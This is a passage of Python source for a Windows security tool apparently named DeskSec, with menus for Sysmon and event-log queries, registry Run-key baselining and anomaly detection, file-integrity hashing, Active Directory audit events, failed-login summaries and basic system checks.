            user = safe_input("🔎 Filter by User (or press Enter to skip): ").strip() or None
            image = safe_input("🔎 Filter by Process Image (or press Enter to skip): ").strip() or None
            command = safe_input("🔎 Filter by Command Line (or press Enter to skip): ").strip() or None
            hashes = safe_input("🔎 Filter by Hashes (or press Enter to skip): ").strip() or None
            
            # Call fetch_sysmon_logs with user-defined filters
            fetch_sysmon_logs(event_id, user, image, command, hashes)
        elif choice == "2":
            print("\n📂 Select Windows Log Category:")
            print("1  System Logs")
            print("2  Security Logs")
            print("3  Application Logs")
            print("4  Back")

            log_choice = safe_input("\nSelect a log category: ")
            log_mapping = {"1": "System", "2": "Security", "3": "Application"}

            if log_choice in log_mapping:
                fetch_event_logs(log_mapping[log_choice])
            else:
                print("❌ Invalid choice. Returning to menu.")
        elif choice == "3":
            file_integrity_menu()
        elif choice == "4":
            active_directory_audit()
        elif choice == "5":
            fetch_failed_logins()
        elif choice == "6":
            registry_anomaly_detector()
        elif choice == "7":
            return  # Go back to the main menu
        else:
            print("❌ This feature is not implemented yet.")
        print("\nReturning to the Security & Log Analysis menu...")
        time.sleep(2)

BASELINE_FILE = "registry_baseline.json"
SCAN_RESULTS_FILE = "registry_scan_results.csv"
ANOMALY_RESULTS_FILE = "detected_registry_anomalies.csv"

REGISTRY_LOCATIONS = [
    (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
    (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"),
    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
    (winreg.HKEY_USERS, r".DEFAULT\Software\Microsoft\Windows\CurrentVersion\Run"),
]

def extract_registry_entries():
    """Extract registry values from multiple locations on Windows."""
    print("\n🛠 Extracting Windows Registry Entries...")
    registry_data = []

    for hive, subkey in REGISTRY_LOCATIONS:
        try:
            with winreg.OpenKey(hive, subkey) as key:
                i = 0
                while True:
                    try:
                        value_name, value_data, _ = winreg.EnumValue(key, i)
                        entry = {
                            "path": subkey,
                            "key": value_name,
                            "value": value_data
                        }
                        registry_data.append(entry)
                        print(entry)  # 🔍 Print to confirm it's collecting the right data
                        i += 1
                    except OSError:
                        break
        except FileNotFoundError:
            continue  # Skip keys that don't exist on this system

    # Convert to DataFrame and Save
    df = pd.DataFrame(registry_data)
    df.to_csv(SCAN_RESULTS_FILE, index=False)
    print(f"✅ Registry data saved to: {SCAN_RESULTS_FILE}")
    return df

def create_baseline():
    """Create a registry baseline from the current scan."""
    df = extract_registry_entries()
    baseline_data = df.to_dict(orient="records")

    with open(BASELINE_FILE, "w") as f:
        json.dump(baseline_data, f, indent=4)
    
    print(f"\n📌 Registry baseline created and saved to: {BASELINE_FILE}")

def normalize_registry_values(df):
    """Normalize registry paths, keys, and values for consistent comparison."""
    df["path"] = df["path"].str.strip().str.lower()
    df["key"] = df["key"].str.strip().str.lower()
    df["value"] = df["value"].astype(str).str.strip().str.lower()  # Convert NaN to string, remove spaces
    return df

def compare_with_baseline():
    """Compare current registry scan with baseline and detect deviations."""
    print("\n🔍 Comparing current registry scan with baseline...")

    # Load Baseline Data
    try:
        with open(BASELINE_FILE, "r") as f:
            baseline_data = json.load(f)
    except FileNotFoundError:
        print("⚠️  No baseline found. Please create one first.")
        return

    baseline_df = pd.DataFrame(baseline_data)
    baseline_df = normalize_registry_values(baseline_df)  # Normalize before comparison

    # Load Current Scan Data
    try:
        current_df = pd.read_csv(SCAN_RESULTS_FILE)
    except FileNotFoundError:
        print("⚠️  No current scan found. Please run a registry scan first.")
        return

    current_df = normalize_registry_values(current_df)  # Normalize before comparison

    # Merge Data on 'path' & 'key' to detect changes
    merged_df = baseline_df.merge(
        current_df,
        on=["path", "key"],
        how="outer",
        suffixes=("_baseline", "_current"),
        indicator=True
    )

    # **Ensure change_type is a string column**
    merged_df["change_type"] = merged_df["_merge"].map({
        "both": "✅ Unchanged",
        "left_only": "❌ Deleted",  # Entries in the baseline but missing from current scan
        "right_only": "🆕 Newly Added"  # Entries in the current scan but missing from baseline
    }).astype(str)  # Convert to string to avoid categorical issues

    # **Detect Modified Entries (Same Key, Different Value)**
    modified_mask = (merged_df["_merge"] == "both") & (merged_df["value_baseline"].astype(str) != merged_df["value_current"].astype(str))

    # **Ensure `change_type` is updated correctly**
    merged_df.loc[modified_mask, "change_type"] = "⚠️ Modified"

    # **Handle Deleted Entries (Entries Missing in Current Scan)**
    deleted_mask = (merged_df["_merge"] == "left_only")
    merged_df.loc[deleted_mask, "value_current"] = "🚨 MISSING"
    merged_df.loc[deleted_mask, "change_type"] = "❌ Deleted"

    # Clean Output
    merged_df = merged_df[["path", "key", "value_baseline", "value_current", "change_type"]].fillna("")

    # Print Changes
    print("\n📊 Registry Changes Detected:")
    if merged_df["change_type"].eq("✅ Unchanged").all():
        print("✅ No registry changes detected.")
    else:
        print(tabulate(merged_df, headers="keys", tablefmt="fancy_grid"))

    # Show summary stats
    print("\n📊 Registry Scan Summary:")
    print(f"✅ Unchanged: {sum(merged_df['change_type'] == '✅ Unchanged')}")
    print(f"⚠️ Modified: {sum(merged_df['change_type'] == '⚠️ Modified')}")
    print(f"🆕 Newly Added: {sum(merged_df['change_type'] == '🆕 Newly Added')}")
    print(f"❌ Deleted: {sum(merged_df['change_type'] == '❌ Deleted')}")

    return merged_df

def detect_anomalies_registry():
    """Run anomaly detection on registry scan results."""
    print("\n🤖 Running AI-driven registry anomaly detection...")

    # Load registry scan
    try:
        df = pd.read_csv(SCAN_RESULTS_FILE)
    except FileNotFoundError:
        print("⚠️ No registry scan results found.")
        return

    if df.empty:
        print("⚠️ No registry entries found.")
        return

    # Convert 'path' and 'key' to numerical features
    df["path_hash"] = df["path"].apply(lambda x: hash(x) % 100000)
    df["key_hash"] = df["key"].apply(lambda x: hash(x) % 100000)
    df["value_length"] = df["value"].apply(lambda x: len(str(x)))  # Capture length as a feature

    # Train IsolationForest
    model = IsolationForest(contamination=0.05, random_state=42)
    model.fit(df[["path_hash", "key_hash", "value_length"]])
    
    df["anomaly_score"] = model.decision_function(df[["path_hash", "key_hash", "value_length"]])
    df["anomaly"] = model.predict(df[["path_hash", "key_hash", "value_length"]])

    anomalies = df[df["anomaly"] == -1]

    if anomalies.empty:
        print("\n✅ No anomalies detected.")
    else:
        print("\n⚠️ Detected potential registry anomalies:")
        print(tabulate(anomalies[["path", "key", "value", "anomaly_score"]], headers="keys", tablefmt="fancy_grid"))

    anomalies.to_csv(ANOMALY_RESULTS_FILE, index=False)
    print(f"\n✅ Anomaly report saved to: {ANOMALY_RESULTS_FILE}")

    return

def fetch_sysmon_logs_custom(event_id=13):
    """Retrieve Sysmon logs filtered for registry changes with progress tracking."""
    if not is_sysmon_installed():
        return []

    start_time = time.time()

    powershell_cmd = [
        "powershell", "-Command",
        f"Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' | "
        f"Where-Object {{ $_.Id -eq {event_id} }} | "
        "Select-Object Id, ProviderName, TimeCreated, Message, Properties | ConvertTo-Json -Depth 3"
    ]

    try:
        result = subprocess.run(powershell_cmd, capture_output=True, text=True)
        logs = json.loads(result.stdout) if result.stdout else []
        
        elapsed_time = time.time() - start_time
        print(f"⏳ Sysmon Log Fetch Time: {elapsed_time:.2f} seconds")

        if not logs:
            return []

        for _ in tqdm.tqdm(logs, desc="Processing Logs", leave=False):
            time.sleep(0.01)  # Simulate processing time

        return logs

    except Exception as e:
        return []

def fetch_event_logs_custom(log_name, event_id=None, provider=None, level=None, keyword=None):
    """Retrieve and filter Windows Event Logs."""
    print(f"📋 Fetching logs from '{log_name}'...\n")

    powershell_cmd = [
        "powershell", "-Command",
        f"Get-WinEvent -LogName '{log_name}' -MaxEvents 50 | "
        "Select-Object Id, ProviderName, LevelDisplayName, TimeCreated, Message | ConvertTo-Json -Depth 2"
    ]

    try:
        result = subprocess.run(powershell_cmd, capture_output=True, text=True)
        print(f"🔍 Raw Event Log Output ({log_name}):\n{result.stdout}")  # DEBUG LOGS

        logs = json.loads(result.stdout) if result.stdout else []
        if not logs:
            print("✅ No logs found.")
            return []

        return logs  # Ensure returning a list

    except Exception as e:
        print(f"❌ Error retrieving logs: {e}")
        return []

def normalize_registry_path(path):
    """Ensure registry paths are consistently formatted."""
    return path.lower().replace("hkey_local_machine", "hklm").replace("hkey_current_user", "hkcu")

def correlate_registry_with_events():
    """Correlate registry changes with Sysmon and Security event logs."""
    print("\n🔍 Correlating Registry Changes with Windows Event Logs...\n")

    start_time = time.time()  # Start timing

    # Fetch the latest registry scan results
    try:
        registry_changes = pd.read_csv(SCAN_RESULTS_FILE)
    except FileNotFoundError:
        print("⚠️ No registry scan results found. Please run an extraction first.")
        return

    # Normalize registry data for consistency
    registry_changes["path"] = registry_changes["path"].str.strip().str.lower()
    registry_changes["key"] = registry_changes["key"].str.strip().str.lower()
    registry_changes["value"] = registry_changes["value"].astype(str).str.strip().str.lower()

    # Fetch Sysmon Event ID 13 (Registry Value Change) & Security Event ID 4657 (Registry Key Modified)
    sysmon_events = fetch_sysmon_logs_custom(event_id=13) or []
    security_events = fetch_event_logs_custom("Security", event_id=4657) or []

    print(f"\n🔍 Retrieved {len(sysmon_events)} Sysmon events and {len(security_events)} Security events.\n")

    correlated_events = []
    uncorrelated_events = []

    # Iterate through each registry change
    for _, row in registry_changes.iterrows():
        reg_path = row["path"]
        reg_key = row["key"]
        reg_value = row["value"]

        matched_sysmon = any(
            reg_path in event.get("Message", "").lower() and reg_key in event.get("Message", "").lower()
            for event in sysmon_events
        )

        matched_security = any(
            reg_path in event.get("Message", "").lower() and reg_key in event.get("Message", "").lower()
            for event in security_events
        )

        # Store correlation results
        if matched_sysmon or matched_security:
            correlation_type = "🔗 Correlated (Sysmon)" if matched_sysmon else "🔗 Correlated (Security)"
            correlated_events.append({
                "path": reg_path,
                "key": reg_key,
                "value": reg_value,
                "correlation": correlation_type
            })
        else:
            uncorrelated_events.append({
                "path": reg_path,
                "key": reg_key,
                "value": reg_value
            })

    # Calculate execution time
    elapsed_time = time.time() - start_time
    print(f"\n⏳ Correlation Execution Time: {elapsed_time:.2f} seconds")

    # Write results to a log file
    with open("correlation_results.json", "w", encoding="utf-8") as f:
        log_data = {
            "correlation_execution_time": elapsed_time,
            "correlated_events": correlated_events,
            "uncorrelated_events": uncorrelated_events,
            "sysmon_events_count": len(sysmon_events),
            "security_events_count": len(security_events)
        }
        json.dump(log_data, f, indent=4)

    # Print Correlation Results
    if correlated_events:
        print("\n📊 Correlated Registry Events Found:\n")
        print(tabulate(correlated_events, headers="keys", tablefmt="fancy_grid"))
    else:
        print("✅ No correlated events found in logs.")

    return correlated_events

def registry_anomaly_detector():
    """Main function to run the tool."""
    while True:
        print("\nWelcome to Registry Anomaly Detector!")
        print("1. Create Baseline")
        print("2. Extract Registry Entries")
        print("3. Compare with Baseline")
        print("4. Trace Changes with Event Logs")
        print("5. Run Anomaly Detection (AI)")
        print("6  Return to the Security and Log Analysis Menu")
        
        choice = safe_input("\nEnter your choice (1-6): ")

        if choice == "1":
            create_baseline()
        elif choice == "2":
            extract_registry_entries()
        elif choice == "3":
            compare_with_baseline()
        elif choice == "4":
            correlate_registry_with_events()
        elif choice == "5":
            detect_anomalies_registry()
        elif choice == "6":
            time.sleep(1)
            break
        else:
            print("Invalid choice, please try again.")
    
def is_sysmon_installed():
    """Check if Sysmon is installed by querying running services."""
    result = subprocess.run(["sc", "query", "Sysmon"], capture_output=True, text=True)
    return "RUNNING" in result.stdout

def fetch_sysmon_logs(event_id=None, user=None, image=None, command=None, hashes=None):
    """Retrieve and filter Sysmon logs from Windows Event Viewer."""
    if not is_sysmon_installed():
        print("❌ Sysmon is not installed or not running.")
        print("➡ Install it from: https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon")
        return

    print("📋 Fetching Sysmon Logs...\n")

    powershell_cmd = [
        "powershell", "-Command",
        "Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -MaxEvents 50 | "
        "Select-Object Id, ProviderName, TimeCreated, Message | ConvertTo-Json -Depth 2"
    ]

    try:
        result = subprocess.run(powershell_cmd, capture_output=True, text=True)
        logs = json.loads(result.stdout) if result.stdout else []

        if not logs:
            print("✅ No Sysmon logs found.")
            return

        structured_logs = []
        for log in logs:
            details = {}
            lines = log["Message"].split("\r\n")

            for line in lines:
                if ": " in line:
                    key, value = line.split(": ", 1)
                    details[key.strip()] = value.strip()

            sysmon_event = {
                "EventID": log["Id"],
                "Provider": log["ProviderName"],
                "TimeCreated": log["TimeCreated"],
                "Details": details
            }

            structured_logs.append(sysmon_event)

        # Apply filtering
        filtered_logs = [
            log for log in structured_logs
            if (not event_id or str(log["EventID"]) == str(event_id))
            and (not user or log["Details"].get("User", "").lower() == user.lower())
            and (not image or log["Details"].get("Image", "").lower() == image.lower())
            and (not command or command.lower() in log["Details"].get("CommandLine", "").lower())
            and (not hashes or hashes.lower() in log["Details"].get("Hashes", "").lower())
        ]

        if filtered_logs:
            print(f"✅ Found {len(filtered_logs)} matching Sysmon events:\n")
            for log in filtered_logs[:10]:  # Show only the latest 10 logs
                print(f"[📌] Event ID: {log['EventID']} | Time: {log['TimeCreated']}")
                print(f"    Process: {log['Details'].get('Image', 'N/A')}")
                print(f"    User: {log['Details'].get('User', 'N/A')}")
                print(f"    Command: {log['Details'].get('CommandLine', 'N/A')}")
                print(f"    Hashes: {log['Details'].get('Hashes', 'N/A')}\n")
        else:
            print("✅ No matching logs found.")

    except Exception as e:
        print(f"❌ Error fetching Sysmon logs: {e}")

def fetch_event_logs(log_name, event_id=None, provider=None, level=None, keyword=None):
    """Retrieve and filter Windows Event Logs from a specified category (System, Security, Application)."""
    print(f"📋 Fetching logs from '{log_name}'...\n")

    powershell_cmd = [
        "powershell", "-Command",
        f"Get-WinEvent -LogName '{log_name}' -MaxEvents 50 | "
        "Select-Object Id, ProviderName, LevelDisplayName, TimeCreated, Message | ConvertTo-Json -Depth 2"
    ]

    try:
        result = subprocess.run(powershell_cmd, capture_output=True, text=True)
        logs = json.loads(result.stdout) if result.stdout else []

        if not logs:
            print("✅ No logs found.")
            return

        # Apply filtering
        filtered_logs = [
            log for log in logs
            if (not event_id or str(log["Id"]) == str(event_id))
            and (not provider or log["ProviderName"].lower() == provider.lower())
            and (not level or log["LevelDisplayName"].lower() == level.lower())
            and (not keyword or keyword.lower() in log["Message"].lower())
        ]

        if filtered_logs:
            print(f"✅ Found {len(filtered_logs)} matching logs from '{log_name}':\n")
            for log in filtered_logs[:10]:  # Show the latest 10 logs
                print(f"[📌] Event ID: {log['Id']} | Time: {log['TimeCreated']} | Level: {log['LevelDisplayName']}")
                print(f"    Provider: {log['ProviderName']}")
                print(f"    Message: {log['Message'][:200]}...\n")  # Limit message preview
        else:
            print("✅ No matching logs found.")

    except Exception as e:
        print(f"❌ Error retrieving logs: {e}")

def calculate_hash(file_path):
    """Calculate SHA-256 hash of a file."""
    try:
        hasher = hashlib.sha256()
        with open(file_path, "rb") as f:
            for chunk in iter(lambda: f.read(4096), b""):
                hasher.update(chunk)
        return hasher.hexdigest()
    except Exception:
        return None  # Ignore unreadable files

def get_baseline_filename(directory):
    """Generate a unique baseline filename based on the directory name."""
    dir_name = os.path.basename(os.path.normpath(directory))
    return f"{dir_name}_baseline.json"

def save_baseline(directory):
    """Save a baseline hash of all files in a directory."""
    baseline_file = get_baseline_filename(directory)
    baseline = {}
    files = []
    
    for root, _, filenames in os.walk(directory):
        for filename in filenames:
            file_path = os.path.join(root, filename)
            files.append(file_path)
    
    print(f"⏳ Scanning {len(files)} files... This may take a while.")
    
    for file in tqdm(files, desc="📁 Creating Baseline", unit=" files"):
        baseline[file] = calculate_hash(file)
    
    with open(baseline_file, "w") as f:
        json.dump(baseline, f, indent=4)
    
    print(f"✅ Baseline saved to {baseline_file}")
    safe_input("\nPress Enter to continue...")  # Pause for user review

def check_integrity(directory):
    """Check integrity of files in a directory against the saved baseline."""
    baseline_file = get_baseline_filename(directory)

    if not os.path.exists(baseline_file):
        print(f"❌ Baseline file '{baseline_file}' not found. Run save_baseline() first.")
        safe_input("\nPress Enter to continue...")  # Pause before returning
        return
    
    with open(baseline_file, "r") as f:
        baseline = json.load(f)
    
    start_time = time.time()
    modified_files = []
    new_files = []
    deleted_files = set(baseline.keys())  # Assume all files are deleted initially
    scanned_files = 0
    
    print(f"⏳ Checking integrity of files in {directory}...")
    for root, _, filenames in os.walk(directory):
        for filename in tqdm(filenames, desc="[🔍] Verifying Files", unit=" files"):
            file_path = os.path.join(root, filename)
            file_hash = calculate_hash(file_path)
            scanned_files += 1
            
            if file_path in baseline:
                deleted_files.discard(file_path)  # Mark file as existing
                if file_hash != baseline[file_path]:
                    modified_files.append(file_path)
            else:
                new_files.append(file_path)
    
    elapsed_time = time.time() - start_time
    print(f"\n⏳ Scan completed in {elapsed_time:.2f} seconds")
    print(f"📊 Total files scanned: {scanned_files}")
    
    if modified_files:
        print(f"⚠️ {len(modified_files)} files were modified:")
        for file in modified_files[:10]:  # Show first 10 for brevity
            print(f"   - {file}")
    else:
        print("✅ No modified files detected.")
    
    if new_files:
        print(f"⚠️ {len(new_files)} new files were found:")
        for file in new_files[:10]:  # Show first 10 for brevity
            print(f"   - {file}")
    else:
        print("✅ No new files detected.")
    
    if deleted_files:
        print(f"⚠️ {len(deleted_files)} files were deleted:")
        for file in list(deleted_files)[:10]:  # Show first 10 for brevity
            print(f"   - {file}")
    else:
        print("✅ No deleted files detected.")

        # 🔥 SYSTEM32 DETECTION & SFC PROMPT 🔥
    if "C:\\Windows\\System32" in directory and modified_files:
        print("\n⚠️  Integrity violations detected in **System32**.")
    
    run_dism = safe_input("🔧 System files may be corrupt. Do you want to run 'DISM /Online /Cleanup-Image /RestoreHealth'? (y/n): ").strip().lower()
    
    if run_dism == "y":
        print("⚙️ Running Deployment Image Servicing and Management (DISM)...")
        subprocess.run([
            "powershell", "-Command",
            "Start-Process -FilePath 'cmd.exe' -ArgumentList '/k DISM /Online /Cleanup-Image /RestoreHealth' -Verb RunAs"
        ], shell=True)
        print("🔄 DISM is running in a new window. **Please restart your system once it completes.**")
        print("➡ After restarting, re-run this tool and choose 'sfc /scannow' to verify the fixes.")
    else:
        print("⚠️ Skipping DISM may result in incomplete repairs.")

    safe_input("\nPress Enter to continue...")  # Pause for user review

def file_integrity_menu():
    """File Integrity Check Menu"""
    while True:
        os.system("cls" if os.name == "nt" else "clear")
        print("\n📁 File Integrity Check")
        print("1  Save Baseline")
        print("2  Check Integrity")
        print("3  SFC **Run After Option 2**")
        print("4  Back to Security & Log Analysis Menu")

        choice = safe_input("\nSelect an option: ")

        if choice == "1":
            directory = safe_input("\nEnter the directory path to save a baseline: ").strip()
            if os.path.exists(directory):
                save_baseline(directory)
            else:
                print("❌ Invalid directory. Please enter a valid path.")
                safe_input("\nPress Enter to continue...")  # Pause before going back
        elif choice == "2":
            directory = safe_input("\nEnter the directory path to check integrity: ").strip()
            if os.path.exists(directory):
                check_integrity(directory)
            else:
                print("❌ Invalid directory. Please enter a valid path.")
                safe_input("\nPress Enter to continue...")  # Pause before going back
        elif choice == "3":
            sfc_choice = safe_input("\nWould you like to run SFC /scannow? (y/n)")
            if sfc_choice == "y":
                print("⚙️ Running System File Checker (SFC)...")
                subprocess.run([
                "powershell", "-Command",
                "Start-Process -FilePath 'cmd.exe' -ArgumentList '/k sfc /scannow' -Verb RunAs"
                ], shell=True)
                print("🔄 SFC is running in a new window. This may take some time.")
                safe_input("\nPress Enter to continue...")  # Pause for user review
                return
            else:
                return

        elif choice == "4":
            return  # Go back to Security & Log Analysis Menu
        else:
            print("❌ Invalid choice. Please try again.")
            safe_input("\nPress Enter to continue...")  # Pause before retrying

def is_domain_joined():
    """Check if the machine is part of an Active Directory domain."""
    try:
        result = subprocess.run(["powershell", "-Command", "(Get-WmiObject Win32_ComputerSystem).PartOfDomain"], capture_output=True, text=True)
        return "True" in result.stdout
    except Exception as e:
        print(f"❌ Error checking domain status: {e}")
        return False

def check_security_log():
    """Check if the Security event log exists on the system."""
    result = subprocess.run(["powershell", "-Command", "wevtutil el | Select-String Security"], capture_output=True, text=True)
    return "Security" in result.stdout

def fetch_ad_audit_logs(event_id=None):
    """Retrieve Active Directory security event logs (Experimental)."""
    
    print("\n⚠️  This feature is **EXPERIMENTAL**. Log availability may depend on system policies.")
    
    if not is_domain_joined():
        print("❌ This system is not joined to an Active Directory domain.")
        return

    if not check_security_log():
        print("\n⚠️  No Security logs found! Logs may be **cleared, disabled, or overwritten.**")
        print("➡ **Troubleshooting Steps:**")
        print("  - Check if auditing is enabled: `auditpol /get /category:*`")
        print("  - Increase Security log size: `wevtutil sl Security /ms:104857600` (100MB)")
        print("  - Ensure Event Log service is running: `Restart-Service EventLog`\n")
        return

    print("📋 Fetching Active Directory security logs...\n")

    powershell_cmd = [
        "powershell", "-Command",
        "Get-WinEvent -LogName 'Security' -MaxEvents 50 | "
        "Where-Object { $_.Id -in (4625, 4740, 4720, 4672, 4732, 4733) } | "
        "Select-Object Id, ProviderName, TimeCreated, Message | ConvertTo-Json -Depth 2"
    ]

    try:
        result = subprocess.run(powershell_cmd, capture_output=True, text=True)

        logs = json.loads(result.stdout) if result.stdout else []

        if not logs:
            print("✅ No relevant Active Directory security logs found.")
            return

        structured_logs = []
        for log in logs:
            details = {}
            lines = log["Message"].split("\r\n") if log["Message"] else []

            for line in lines:
                if ":\t" in line:
                    key, value = line.split(":\t", 1)
                    details[key.strip()] = value.strip()

            ad_event = {
                "EventID": log["Id"],
                "Provider": log["ProviderName"],
                "TimeCreated": convert_windows_time(log["TimeCreated"]),  # Convert time
                "Details": details
            }

            structured_logs.append(ad_event)

        # Apply filtering
        filtered_logs = [log for log in structured_logs if not event_id or str(log["EventID"]) == str(event_id)]

        if filtered_logs:
            print(f"✅ Found {len(filtered_logs)} relevant AD security events:\n")
            for log in filtered_logs[:10]:  # Show latest 10 logs
                print(f"📌 Event ID: {log['EventID']} | Time: {log['TimeCreated']}")
                print(f"    Details: {json.dumps(log['Details'], indent=4)}\n")
        else:
            print("✅ No matching logs found.")

    except json.JSONDecodeError:
        print("❌ Error: Could not parse JSON from PowerShell output.")
        print(f"📝 Raw output received:\n{result.stdout}")

    except Exception as e:
        print(f"❌ Error fetching AD audit logs: {e}")

def convert_windows_time(timestamp):
    """Convert PowerShell /Date(XXXXXXXXXX)/ format to readable time."""
    try:
        timestamp = int(timestamp.strip("/Date()/"))
        return datetime.utcfromtimestamp(timestamp / 1000).strftime('%Y-%m-%d %H:%M:%S')
    except Exception:
        return "Unknown"

def active_directory_audit():
    """Active Directory Audit Menu"""
    while True:
        clear_screen()
        print("\n🛡  DeskSec - Active Directory Audit")
        print("1  View Failed Login Attempts (Event ID 4625)")
        print("2  View Account Lockouts (Event ID 4740)")
        print("3  View New User Creations (Event ID 4720)")
        print("4  View Privilege Escalation Events (Event ID 4672)")
        print("5  View Group Membership Changes (Event ID 4732 & 4733)")
        print("6  Run Full AD Security Audit")
        print("7  Back to Security Menu")

        choice = safe_input("\nSelect an option: ")

        if choice == "1":
            fetch_ad_audit_logs(event_id=4625)
        elif choice == "2":
            fetch_ad_audit_logs(event_id=4740)
        elif choice == "3":
            fetch_ad_audit_logs(event_id=4720)
        elif choice == "4":
            fetch_ad_audit_logs(event_id=4672)
        elif choice == "5":
            fetch_ad_audit_logs(event_id=None)  # Fetches all AD events
        elif choice == "6":
            fetch_ad_audit_logs()  # Fetch all logs
        elif choice == "7":
            return  # Go back to Security Menu
        else:
            print("❌ Invalid choice. Please select a valid option.")

        safe_input("\nPress Enter to continue...")  # Pause before returning to menu

def fetch_failed_logins():
    """Retrieve and analyze failed login attempts (Event ID: 4625)."""
    print("\n📋 Fetching Failed Login Attempts. This is an **EXPERIMENTAL** feature that may not work correctly...")

    powershell_cmd = [
        "powershell", "-Command",
        "Get-WinEvent -LogName 'Security' -MaxEvents 100 | "
        "Where-Object { $_.Id -eq 4625 } | "
        "Select-Object Id, ProviderName, TimeCreated, Message | ConvertTo-Json -Depth 2"
    ]

    try:
        result = subprocess.run(powershell_cmd, capture_output=True, text=True)
        logs = json.loads(result.stdout) if result.stdout else []

        if not logs:
            print("✅ No failed login attempts found.")
            time.sleep(2)
            return

        user_attempts = Counter()
        ip_attempts = Counter()
        structured_logs = []

        for log in logs:
            details = {}
            lines = log["Message"].split("\r\n") if log["Message"] else []

            for line in lines:
                if ":\t" in line:
                    key, value = line.split(":\t", 1)
                    details[key.strip()] = value.strip()

            username = details.get("Account Name", "Unknown")
            source_ip = details.get("Source Network Address", "Unknown")

            user_attempts[username] += 1
            ip_attempts[source_ip] += 1

            structured_logs.append({
                "EventID": log["Id"],
                "TimeCreated": convert_windows_time(log["TimeCreated"]),
                "Username": username,
                "Source IP": source_ip
            })

        # Display Summary
        print("\n📊 Summary of Failed Login Attempts:")
        print(f"    - Total Events: {len(structured_logs)}")
        print(f"    - Unique Users: {len(user_attempts)}")
        print(f"    - Unique IPs: {len(ip_attempts)}")

        print("\n🔍 Top 5 Users with Failed Logins:")
        for user, count in user_attempts.most_common(5):
            print(f"    - {user}: {count} attempts")

        print("\n🌐 Top 5 IPs with Failed Logins:")
        for ip, count in ip_attempts.most_common(5):
            print(f"    - {ip}: {count} attempts")

        # Show details of the last 5 failed attempts
        print("\n📌 Last 5 Failed Login Attempts:")
        for log in structured_logs[:5]:  # Show latest 5 logs
            print(f"    - Time: {log['TimeCreated']}")
            print(f"      User: {log['Username']}")
            print(f"      Source IP: {log['Source IP']}\n")

    except json.JSONDecodeError:
        print("❌ Error: Could not parse JSON from PowerShell output.")
        print(f"📝 Raw output received:\n{result.stdout}")

    except Exception as e:
        print(f"❌ Error fetching failed login attempts: {e}")

def convert_windows_time(timestamp):
    """Convert PowerShell /Date(XXXXXXXXXX)/ format to readable time."""
    try:
        timestamp = int(timestamp.strip("/Date()/"))
        return datetime.utcfromtimestamp(timestamp / 1000).strftime('%Y-%m-%d %H:%M:%S')
    except Exception:
        return "Unknown"

###########################################################################
#                                                                         #
#                         AUTOMATION TOOLS MENU                           #
#                                                                         #
###########################################################################

def automation_tools_menu():
    """Automation & Scripting Menu (Upcoming)"""
    while True:
        clear_screen()
        print("\n🤖  DeskSec - Automation & Scripting")
        print("1  Automated System Health Report")
        print("2  Remote System Reboot/Shutdown")
        print("3  Script to Enforce Group Policies")
        print("4  Automated Vulnerability Scanner")
        print("5  Back to Main Menu")

        choice = safe_input("\nSelect an option: ")

        if choice == "1":
            get_system_health_report()
        elif choice == "2":
            remote_reboot_shutdown()
        elif choice == "3":
            enforce_gpo()
        elif choice == "4":
            automated_vuln_scan()
        elif choice == "5":
            return  # Go back to the main menu
        else:
            print("❌ This feature is not implemented yet.")

def is_nmap_installed():
    """Check if Nmap is installed and return the path"""
    nmap_path = shutil.which("nmap")
    if nmap_path:
        print(f"✅ Nmap is installed at: {nmap_path}")
        return nmap_path

    print("❌ Nmap is not installed!")
    install_choice = safe_input("🔧 Would you like to install Nmap? (y/n): ").strip().lower()
    if install_choice == "y":
        install_nmap()
        return shutil.which("nmap")

    return None

def install_nmap():
    """Attempt to install Nmap automatically"""
    print("\n🔄 Installing Nmap...")
    try:
        subprocess.run(["winget", "install", "--id", "Nmap.Nmap"], check=True)
        print("✅ Nmap installation completed.")
    except Exception as e:
        print(f"❌ Nmap installation failed: {e}")

def run_windows_defender_scan():
    """Trigger Windows Defender Quick Scan."""
    print("🛡️  Running Windows Defender Quick Scan...")
    try:
        subprocess.run(["powershell", "-Command", "Start-MpScan -ScanType QuickScan"], capture_output=True, text=True)
        print("✅ Windows Defender scan completed.")
    except Exception as e:
        print(f"❌ Error running Windows Defender scan: {e}")

def check_missing_windows_updates():
    """Check for missing security updates."""
    print("🔍 Checking for missing Windows security updates...")
    try:
        result = subprocess.run(["powershell", "-Command", "Get-HotFix | ConvertTo-Json -Depth 2"], capture_output=True, text=True)
        updates = json.loads(result.stdout) if result.stdout else []
        if updates:
            print(f"📌 {len(updates)} security updates installed.")
        else:
            print("⚠️  No security updates detected.")
    except Exception as e:
        print(f"❌ Error checking Windows updates: {e}")

def check_open_ports():
    """Check for open ports on the local machine."""
    print("[🔍] Checking open ports on local machine...")
    try:
        result = subprocess.run(["netstat", "-ano"], capture_output=True, text=True)
        lines = result.stdout.split("\n")
        open_ports = [line for line in lines if "LISTENING" in line]
        
        if open_ports:
            print(f"⚠️  {len(open_ports)} open ports detected:\n")
            for port in open_ports[:10]:  # Show first 10 for brevity
                print(f"   - {port.strip()}")
        else:
            print("✅ No open ports detected.")
    except Exception as e:
        print(f"❌ Error checking open ports: {e}")

def detect_network_devices():
    """Detect active network devices."""
    print("🌐 Detecting active network devices...")
    try:
        result = subprocess.run(["arp", "-a"], capture_output=True, text=True)
        devices = re.findall(r"(\d+\.\d+\.\d+\.\d+)", result.stdout)
        unique_devices = list(set(devices))
        
        if unique_devices:
            print(f"📌 {len(unique_devices)} devices found on the network.")
            return unique_devices
        else:
            print("✅ No active devices detected.")
            return []
    except Exception as e:
        print(f"❌ Error detecting network devices: {e}")
        return []

def get_network_range():
    """Automatically detect the current network range (CIDR notation)."""
    try:
        # Run ipconfig and capture output
        result = subprocess.run(["ipconfig"], capture_output=True, text=True)

        # Extract IPv4 Address & Subnet Mask
        ip_address = None
        subnet_mask = None

        for line in result.stdout.split("\n"):
            if "IPv4 Address" in line:
                ip_address = re.search(r"(\d+\.\d+\.\d+\.\d+)", line)
                if ip_address:
                    ip_address = ip_address.group(1)
            if "Subnet Mask" in line:
                subnet_mask = re.search(r"(\d+\.\d+\.\d+\.\d+)", line)
                if subnet_mask:
